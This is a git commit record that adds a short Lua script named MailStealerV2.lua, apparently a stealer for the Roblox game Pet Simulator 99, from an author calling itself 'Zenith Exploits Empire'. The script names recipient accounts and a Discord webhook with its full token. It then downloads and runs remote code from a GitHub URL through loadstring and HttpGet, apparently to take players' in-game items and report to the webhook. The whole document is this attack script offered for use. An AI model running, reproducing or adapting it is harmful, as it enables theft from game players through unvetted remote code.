dfdebb7ea09c4bd753efd3fb7cf1aaad0134b4ea
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-23 17:16:47 +0200

    Add new script

---
+++ ps99/MailStealerV2.lua
@@ -0,0 +1,5 @@
+Username = "EZYvladut23929"
+Username2 = "EZYvladut23929"
+Webhook = "https://discord.com/api/webhooks/1363744313670107146/KPVEsESLkFdxw4D-pDZegcUzcChprbjk2C6bbRM_ALEy3IMlWYl7Ey6_Gmkl5tB6OOZ1"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
